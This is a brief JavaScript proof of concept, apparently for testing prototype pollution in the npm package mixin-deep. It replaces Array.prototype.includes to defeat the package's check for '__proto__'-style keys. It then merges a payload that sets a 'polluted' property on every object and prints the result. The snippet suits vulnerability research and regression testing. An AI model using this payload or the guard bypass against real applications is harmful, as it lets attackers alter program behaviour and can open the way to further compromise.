Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const mixin = require('mixin-deep');
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
let obj = {};
console.log({}.polluted);
mixin({}, JSON.parse(malicious_payload));
console.log({}.polluted);